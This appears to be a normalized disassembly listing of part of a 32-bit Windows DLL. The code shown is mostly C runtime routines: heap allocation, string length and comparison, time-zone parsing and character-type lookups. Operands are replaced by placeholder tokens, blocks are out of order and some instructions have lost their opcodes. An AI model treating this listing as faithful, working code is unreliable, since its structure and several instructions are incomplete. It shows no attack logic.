lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_1000e247
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_1000e342
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_1000e640
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
inc ecx
neg ecx
dec edi
mov al [ ebp + 0xc ]
std
[ edi ]
inc edi
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_1000e667
push esi
push 0xc
call sub_1000b7a4
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0x0
call sub_1000e68e
push 0xc
mov esi eax
call sub_1000b805
add esp 0x14
mov eax esi
pop esi
retn
sub_1000e68e
push ebp
mov ebp esp
sub esp 0x108
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push eax
push 0x104
call [ GetCurrentDirectoryA@IAT ]
push ebx
call sub_1000e763
test eax eax
pop ecx
jne r-xdata
xor eax eax
inc eax
cmp eax 0x104
ja r-xdata
lea eax [ ebp - 0x4 ]
and [ ebp + 0xb ] 0x0
push eax
lea eax [ ebp - 0x108 ]
push eax
lea eax [ ebp + 0x8 ]
add bl 0x40
push 0x104
push eax
mov [ ebp + 0x8 ] bl
mov [ ebp + 0x9 ] 0x3a
mov [ ebp + 0xa ] 0x2e
call [ GetFullPathNameA@IAT ]
jmp r-xdata
call sub_1000a5d8
mov [ eax ] 0xf
call sub_1000a5cf
mov [ eax ] 0xd
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
test eax eax
je r-xdata
cmp eax [ ebp + 0x10 ]
jle r-xdata
cmp eax [ ebp + 0x10 ]
jg r-xdata
lea eax [ ebp - 0x108 ]
push eax
push ecx
call sub_1000b3d0
pop ecx
pop ecx
jmp r-xdata
call sub_1000a5cf
mov [ eax ] 0x22
jmp r-xdata
push eax
call sub_10008cba
pop ecx
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x10 ]
pop ebx
leave
retn
call sub_1000a5cf
mov [ eax ] 0xc
jmp r-xdata
sub_1000e763
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x1
pop eax
pop ebp
retn
and [ ebp + 0xb ] 0x0
add al 0x40
mov [ ebp + 0x8 ] al
lea eax [ ebp + 0x8 ]
push eax
mov [ ebp + 0x9 ] 0x3a
mov [ ebp + 0xa ] 0x5c
call [ GetDriveTypeA@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
cmp eax 0x1
je r-xdata
sub_1000e79a
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp + 0x8 ] edi
jne r-xdata
push esi
push 0x19
call sub_1000b7a4
mov edx [ ebp + 0x10 ]
pop ecx
test edx edx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_10007bc0
add esp 0xc
jmp r-xdata
mov eax edx
dec edx
test eax eax
pop esi
je r-xdata
mov ecx [ ebp + 0xc ]
pop edi
pop ebp
retn
push 0x19
call sub_1000b805
mov eax [ ebp + 0x8 ]
pop ecx
lea ecx [ edx + 0x1 ]
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
inc edi
inc ecx
test al al
je r-xdata
inc edi
inc ecx
test edx edx
je r-xdata
test edx edx
jne r-xdata
and [ edi - 0x1 ] 0x0
jmp r-xdata
mov al [ ecx ]
dec edx
mov [ edi ] al
inc edi
inc ecx
test al al
je r-xdata
mov al [ ecx ]
dec edx
movzx esi al
test [ esi + rw-data ] 0x4
mov [ edi ] al
je r-xdata
jmp r-xdata
and [ edi - 0x2 ] 0x0
jmp r-xdata
sub_1000e840
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_1000e8bb
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xb
call sub_1000b7a4
cmp [ rw-data ] 0x0
pop ecx
jne r-xdata
push 0xb
call sub_1000b805
pop ecx
call sub_1000e8e9
inc [ rw-data ]
sub_1000e8e9
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0xc
pop edi
xor ebx ebx
push edi
mov [ ebp - 0x8 ] ebx
call sub_1000b7a4
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
mov [ rw-data ] ebx
mov [ esp ] r--data
call sub_1000fb91
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push edi
call sub_1000b805
mov [ esp ] rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
push edi
call sub_1000b805
pop ecx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x3c
cmp [ rw-data ] bx
push 0x1
pop edx
mov [ rw-data ] eax
mov [ rw-data ] edx
je r-xdata
push [ rw-data ]
call sub_10008d46
push esi
call sub_1000e840
inc eax
push eax
call sub_10008cba
add esp 0xc
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push eax
push esi
call sub_1000d0f0
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov esi ecx
imul esi esi 0x3c
add eax esi
mov [ rw-data ] eax
push esi
push eax
call sub_1000b3d0
push edi
call sub_1000b805
push 0x3
push esi
push [ rw-data ]
call sub_10007bc0
mov eax [ rw-data ]
add esi 0x3
add esp 0x18
and [ eax + 0x3 ] 0x0
cmp [ esi ] 0x2d
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push esi
call sub_1000a701
pop ecx
mov bl 0x30
mov ecx eax
imul ecx ecx 0xe10
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] 0x1
inc esi
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ ebp - 0x4 ] ebx
jne r-xdata
sub eax ecx
mov [ rw-data ] edx
imul eax eax 0x3c
mov [ rw-data ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al bl
jl r-xdata
mov eax [ rw-data ]
and [ eax ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov esi [ WideCharToMultiByte@IAT ]
push eax
push ebx
push 0x3f
mov edi 0x220
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
push 0x3f
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
inc esi
push esi
call sub_1000a701
imul eax eax 0x3c
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
movsx eax [ esi ]
test eax eax
mov [ rw-data ] eax
je r-xdata
neg ecx
mov [ rw-data ] ecx
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
push 0x3
push esi
push [ rw-data ]
call sub_10007bc0
mov eax [ rw-data ]
add esp 0xc
and [ eax + 0x3 ] 0x0
jmp r-xdata
inc esi
push esi
call sub_1000a701
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
inc esi
jmp r-xdata
cmp al 0x39
jg r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
inc esi
jmp r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
sub_1000eb91
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x1
pop ebx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp eax [ rw-data ]
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push edi
push edi
push 0x2
push edi
push edi
push ebx
push 0x4
push eax
push ebx
push ebx
call sub_1000ed3d
push edi
push edi
push edi
push 0x2
push edi
push edi
push 0x5
push 0xa
push [ esi + 0x14 ]
push ebx
push edi
call sub_1000ed3d
add esp 0x58
movzx ecx [ rw-data ]
push ecx
cmp [ rw-data ] di
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esi + 0x1c ]
cmp edx eax
jge r-xdata
cmp ecx eax
jl r-xdata
cmp ecx edx
jl r-xdata
movzx ecx [ rw-data ]
push ecx
push edi
movzx ecx [ rw-data ]
push edi
push ecx
push eax
push edi
movzx ecx [ rw-data ]
push edi
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
push eax
push ebx
jmp r-xdata
mov eax ebx
cmp ecx edx
jg r-xdata
cmp ecx eax
jg r-xdata
movzx eax [ rw-data ]
push eax
push edi
movzx eax [ rw-data ]
push edi
push eax
push [ esi + 0x14 ]
push edi
jmp r-xdata
movzx eax [ rw-data ]
push edi
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
push [ esi + 0x14 ]
push ebx
push ebx
call sub_1000ed3d
movzx eax [ rw-data ]
add esp 0x2c
cmp [ rw-data ] di
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
cmp ecx eax
jle r-xdata
cmp ecx edx
jle r-xdata
push edi
call sub_1000ed3d
add esp 0x2c
jmp r-xdata
mov eax [ esi + 0x8 ]
imul eax eax 0x3c
add eax [ esi + 0x4 ]
imul eax eax 0x3c
add eax [ esi ]
imul eax eax 0x3e8
cmp ecx edx
jne r-xdata
cmp ecx edx
jl r-xdata
cmp ecx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
jmp r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setge cl
mov eax ecx
jmp r-xdata
sub_1000ed3d
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
push ebx
mov ebx [ ebp + 0x10 ]
push esi
jne r-xdata
mov eax [ ebp + 0x14 ]
test bl 0x3
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp + 0x10 ] ebx
and [ ebp + 0x10 ] 0x3
mov esi eax
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov ecx [ eax * 4 + rw-data ]
jmp r-xdata
shl esi 0x2
mov eax [ esi + rw-data ]
shl esi 0x2
mov eax [ esi + rw-data ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
imul eax eax 0x3c
add eax [ rw-data ]
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jns r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
mov [ rw-data ] ebx
imul eax eax 0x3c
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jmp r-xdata
add ecx [ ebp + 0x20 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
add ecx eax
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
lea ecx [ ecx + eax - 0x7 ]
jmp r-xdata
mov edx ebx
lea ecx [ eax + 0x1 ]
imul edx edx 0x16d
lea eax [ ebx - 0x1 ]
push edi
sar eax 0x2
mov edi ecx
push 0x7
add edi eax
lea eax [ edx + edi - 0x63db ]
pop edi
cdq
idiv edi
mov eax [ ebp + 0x18 ]
pop edi
cmp edx [ ebp + 0x1c ]
jge r-xdata
mov edx 0x5265c00
cmp eax edx
jl r-xdata
add eax 0x5265c00
dec ecx
mov [ rw-data ] eax
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x18 ] 0x5
jne r-xdata
mov [ rw-data ] ebx
sub eax edx
inc ecx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov esi [ esi + rw-data ]
mov esi [ esi + rw-data ]
jmp r-xdata
sub ecx 0x7
jmp r-xdata
cmp ecx esi
jle r-xdata
sub_1000ee7d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_10007d40
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_10009030
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_1000efd0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov al 0xff
mov edi edi
[ rw-data ]
push 0x13
call sub_1000b7a4
mov [ esp ] 0x1
push 0x0
jmp r-xdata
movsx eax al
jmp r-xdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je r-xdata
mov ebx eax
pop eax
or eax eax
jne r-xdata
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je r-xdata
mov eax 0xff
xor ebx ebx
nop
pop ebx
pop esi
pop edi
leave
retn
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
push 0x13
call sub_1000b805
add esp 0x4
[ rw-data ]
jmp r-xdata
or al al
je r-xdata
push eax
push ebx
call sub_1000fc0e
mov ebx eax
add esp 0x4
call sub_1000fc0e
add esp 0x4
cmp bl al
je r-xdata
sbb al al
sbb al 0xff
mov eax ebx
sbb eax eax
sbb eax 0xffffffff
sub_1000f0a0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
inc edx
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_1000f0e0
push ebp
mov ebp esp
push edi
push esi
mov edi [ ebp + 0x8 ]
mov edx edi
mov esi edi
xor eax eax
or ecx 0xffffffff
[ edi ]
cmp ecx 0xfffffffe
je r-xdata
mov eax edx
pop esi
pop edi
leave
retn
dec edi
dec edi
mov ah [ esi ]
mov al [ edi ]
mov [ esi ] al
mov [ edi ] ah
inc esi
dec edi
jmp r-xdata
cmp esi edi
jae r-xdata
sub_1000f110
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_1000ee7d
add esp 0x1c
test eax eax
jne r-xdata
sub_1000f190
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_1000f230
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
